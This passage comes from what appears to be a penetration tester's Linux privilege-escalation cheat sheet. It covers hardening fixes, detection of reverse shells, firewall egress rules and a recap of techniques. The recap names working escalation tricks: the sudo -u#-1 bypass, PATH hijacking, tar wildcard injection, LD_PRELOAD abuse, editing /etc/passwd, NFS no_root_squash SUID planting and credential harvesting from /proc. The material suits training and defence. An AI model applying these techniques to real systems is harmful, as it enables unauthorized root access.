| SUID on non-standard binaries | `chmod u-s /path/to/binary` | Removes the privilege raise entirely |
| Broad sudo rules | Grant specific arguments, never a shell-capable binary | `vim`, `find`, `awk`, `less`, `journalctl` all give a root shell |
| `env_keep+=LD_PRELOAD` | Remove it, keep `env_reset` | Closes Section 13 |
| No `secure_path` in sudoers | Set it | Closes Section 9 for sudo |
| World writable cron scripts | `chown root:root` and `chmod 700` | Only root can edit what root runs |
| Writable script directory | `chmod 755` on the directory | Deleting a file needs directory write access |
| `/etc/shadow` readable | `chmod 640 /etc/shadow; chown root:shadow /etc/shadow` | |
| Unnecessary capabilities | `setcap -r /path/to/binary` | |
| Users in `docker` or `lxd` | Remove them, or accept that they are root | The groups cannot be made safe |
| `no_root_squash` in `/etc/exports` | Change to `root_squash`, then `exportfs -ra` | Remote root maps to `nobody` again |

### Fix the patching

```bash
# Debian and Ubuntu
apt update && apt upgrade
dpkg -l unattended-upgrades

# RHEL and CentOS
dnf check-update
```

Unattended security updates close the entire kernel exploit section, and it is the single highest value recommendation in most reports.

### Audit for it before an attacker does

```bash
# SUID inventory, run on a schedule and compare against the last run
find / -perm -4000 -type f 2>/dev/null | sort > /var/log/suid-$(date +%F).txt
diff /var/log/suid-2026-03-01.txt /var/log/suid-2026-03-12.txt
```

A `diff` between two dates shows exactly which SUID binaries appeared, which is both a hardening check and an intrusion detection signal.

```bash
# find world writable files outside the expected places
find / -perm -o+w -type f 2>/dev/null | grep -vE "^/(proc|sys|dev|tmp)"

# check sudo rules for shell-capable binaries
grep -rE "vim|vi|less|more|awk|find|nmap|journalctl|python|perl" /etc/sudoers /etc/sudoers.d/
```

### Why filtering is not on this list

Every fix above changes **what is permitted**, not what input is accepted. There is no way to detect a malicious `tar` in `$PATH` or a malicious filename, because both are legitimate constructs. Remove the capability, do not try to spot the abuse.

---

## 23. Detection and Response

**Why an offensive sheet covers this:** a report needs a remediation section, and clients ask how they would have caught you. These are also the commands you use to verify a host is clean after a test.

### Find and stop a suspicious process

```bash
ps -eo pid,ppid,user,etime,cmd --sort=start_time | tail -20
```

| Field | Why it is in the list |
|-------|-----------------------|
| `ppid` | The parent. A shell whose parent is a web server is a web shell |
| `user` | Who it runs as |
| `etime` | How long it has been running. A brand new root process deserves a look |
| `--sort=start_time` | Newest last, so `tail` shows the most recent |

```
  PID  PPID USER     ELAPSED CMD
 4102  2231 www-data   00:14 bash -i
```

`bash -i` owned by `www-data` with a web server as its parent is a reverse shell.

```bash
lsof -p 4102
```

`lsof` lists the files and sockets a process has open, which shows you where it is connected before you kill it.

```bash
kill -15 4102     # SIGTERM, asks the process to exit cleanly
kill -9 4102      # SIGKILL, the kernel destroys it, no cleanup
pkill -f "backup.sh"   # kill by command line pattern rather than PID
```

Use `-15` first. `-9` gives the process no chance to close files, and it also loses forensic detail.

### Spot the network side

```bash
ss -tp state established
```

Unlike `-l` for listening, `state established` shows live connections.

```
ESTAB 0 0 10.10.10.5:44312 10.10.14.3:4444 users:(("bash",pid=4102))
```

| Observation | Meaning |
|-------------|---------|
| Owned by `bash` | Shells do not make outbound connections on their own |
| Destination port `4444` | A common listener port |
| **Outbound** from a server | Servers accept connections, they rarely initiate them |

The direction is the strongest signal. Egress filtering is what stops this, and most environments do not have it.

### Capture traffic

```bash
tcpdump -i eth0 -nn -s0 -w /tmp/cap.pcap
```

| Flag | Meaning |
|------|---------|
| `-i eth0` | Which interface |
| `-nn` | Do not resolve hostnames or port names, which is faster and avoids DNS lookups that tip off an attacker |
| `-s0` | Capture the full packet rather than the first 68 bytes |
| `-w file.pcap` | Write raw packets for later analysis in Wireshark |

```bash
tcpdump -i eth0 -nn 'port not 22 and host 10.10.14.3'
```

The filter excludes your own SSH session, which would otherwise fill the capture with your own traffic.

```bash
tcpdump -r /tmp/cap.pcap -A | grep -i "pass"
```

`-r` reads a saved capture, `-A` prints packet contents as text. Anything sent over an unencrypted protocol is readable here, which is the argument for encrypting internal traffic.

### Audit the host

```bash
lynis audit system
```

Lynis runs hundreds of configuration checks and scores the result.

```
[+] Hardening
  - Hardening index : 61 [#############       ]
[!] Found vulnerable package(s)
  - Sudo version 1.8.21p2 is outdated
[!] Suggestion: Set a password on GRUB bootloader [BOOT-5122]
```

The hardening index is a rough figure, not a grade. The suggestion list is the useful output, because each entry has an ID you can cite in a report.

```bash
nmap -sV -sC -p- 10.10.10.5
```

| Flag | Meaning |
|------|---------|
| `-sV` | Probe each open port to identify the software and version |
| `-sC` | Run the default script set, which checks for common issues |
| `-p-` | All 65535 ports, not just the top 1000 |

Run this from outside to see the host the way an attacker does, and compare it against `ss -tulpn` from inside. Anything reachable that should not be is a firewall gap.

### Firewall

```bash
ufw status verbose
```

`ufw` is a simpler front end to iptables, and it is what Ubuntu systems usually use.

```bash
ufw default deny incoming
ufw default deny outgoing
ufw allow from 10.10.10.0/24 to any port 22
ufw enable
```

**`default deny outgoing` is the line that matters here.** It is what breaks the reverse shell above, and it is the control most environments are missing.

The iptables equivalents, for hosts without ufw:

```bash
iptables -L -n -v                                    # list rules, numeric, with counters
iptables -A OUTPUT -p tcp --dport 4444 -j DROP       # append an OUTPUT rule
iptables-save > /etc/iptables/rules.v4               # persist across reboot
```

| Piece | Meaning |
|-------|---------|
| `-A OUTPUT` | Append to the outbound chain |
| `-p tcp --dport 4444` | Match TCP to destination port 4444 |
| `-j DROP` | Discard silently. `REJECT` would reply, telling the attacker the rule exists |

`iptables` rules vanish on reboot unless saved, which is the most common mistake with them.

---

## 24. Fast Recall

- **Everything is `euid`.** `uid=1000 euid=0` is already root for file access. `bash -p` keeps it, plain `bash` drops it.
- **Three routes only:** make a root process act for you, abuse a privilege-raising mechanism, or break the kernel.
- **Start with `id` and `sudo -l`.** Between them they solve a large share of hosts.
- **`sudo -l` fields:** `NOPASSWD` means no password needed, `(ALL)` includes root, `env_keep+=LD_PRELOAD` is a vulnerability on its own.
- **GTFOBins logic:** if the allowed binary can run a command, read a file, or write a file, it is root. Pagers escape with `!`, so `sudo journalctl` is a root shell.
- **`sudo -u#-1` bypasses a `(ALL, !root)` rule** on sudo below 1.8.28.
- **SUID hunt:** `find / -perm -4000 -type f 2>/dev/null`. Normal is `su`, `passwd`, `mount`. Abnormal is `find`, `vim`, `python`, anything in `/usr/local/bin`.
- **Capabilities are invisible in `ls`.** `getcap -r / 2>/dev/null`. `cap_setuid` is direct root, `cap_dac_override` writes any file, `cap_dac_read_search` reads any file.
- **PATH hijack:** a privileged binary calling `tar` instead of `/bin/tar`. Drop a script named `tar` in `/tmp`, `export PATH=/tmp:$PATH`.
- **`/etc/passwd` field 3 is the uid, and 0 is root.** Field 2 still accepts a hash directly. Always append with `>>`.
- **`/etc/shadow` should be `640 root:shadow`.** World readable is critical on its own. `$6$` is SHA-512.
- **Cron:** `*/5` means every five minutes. Append to the script, never overwrite. Use `pspy` for jobs you cannot read.
- **Wildcard injection:** `tar ... *` plus filenames `--checkpoint=1` and `--checkpoint-action=exec=sh x.sh`. Also `rsync -e`, `chown --reference`.
- **`LD_PRELOAD` needs `env_keep`** in sudoers. `_init()` or `__attribute__((constructor))` runs before the program does. `unsetenv` first or you loop.
- **`ldd` on a SUID binary** shows library paths. One inside your home directory, or `not found`, is a hijack.
- **Credentials beat exploits.** Grep configs, backups, history, `/proc/*/environ`. Then reuse the password on every account and re-run `sudo -l`.
- **`unshadow passwd shadow > out`** before John, because the hash and the username live in different files.
- **`docker`, `lxd`, `disk`, `shadow`, `adm` group membership is root** by design, not by bug.
- **`no_root_squash`:** build a SUID bash on your own machine, drop it on the share, run it on the target.
- **Restricted shell:** any interpreter escapes it. `python3 -c 'import pty; pty.spawn("/bin/bash")'`. Fix `$PATH` afterwards.
- **Check `/proc/1/cgroup` before claiming root.** Container root is not host root.
- **Remove every SUID bit you set.** Leaving `+s` on `/bin/bash` makes the host worse than you found it.

---

## 25. Resources

**Reference**
- [GTFOBins](https://gtfobins.github.io/)
- [g0tmi1k: Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [MITRE ATT&CK: Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
- [Linux capabilities manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)

**Tools**
- [LinPEAS (PEASS-ng)](https://github.com/carlospolop/PEASS-ng)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
- [pspy](https://github.com/DominicBreuker/pspy)
- [John the Ripper](https://www.openwall.com/john/)
- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)

**Hardening**
- [Lynis](https://cisofy.com/lynis/)
- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks)
- [Ubuntu Security Guide](https://ubuntu.com/security)

**Practice**
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe: Linux PrivEsc](https://tryhackme.com/)
